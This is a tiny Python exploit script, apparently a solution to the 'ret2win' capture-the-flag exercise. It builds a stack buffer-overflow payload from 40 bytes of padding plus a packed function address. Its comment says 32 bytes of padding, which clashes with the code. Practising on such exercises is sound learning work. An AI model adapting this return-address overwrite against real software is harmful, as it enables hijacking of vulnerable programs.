#!/usr/bin/env python

# ret2win: 0x0000000000400756
# padding: 32 bytes

import struct
import sys

payload = b'A'*40
payload += struct.pack('I', 0x0000000000400756)

sys.stdout.buffer.write(payload)
